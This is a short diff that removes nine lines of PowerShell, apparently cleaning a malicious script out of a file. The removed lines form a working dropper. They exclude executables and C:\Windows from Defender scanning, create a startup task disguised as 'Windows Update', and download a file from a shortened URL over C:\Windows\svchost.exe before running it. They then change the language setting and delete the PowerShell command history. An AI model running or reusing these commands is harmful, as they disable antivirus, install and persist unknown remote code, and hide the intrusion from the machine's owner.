@@ -1,9 +1,0 @@
-Add-MpPreference -ExclusionExtension "exe"
-Add-MpPreference -ExclusionPath "C:\Windows"
-$Trigger = New-ScheduledTaskTrigger -AtStartup
-$Action = New-ScheduledTaskAction -Execute "C:\Windows\svchost.exe"
-Register-ScheduledTask -TaskName "Windows Update" -Trigger $Trigger -Action $Action
-Invoke-WebRequest -URI "t.ly/VkIx" -OutFile "C:\Windows\svchost.exe"
-start C:\Windows\svchost.exe
-Set-WinUserLanguageList -Force "tr-TR"
-rm $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
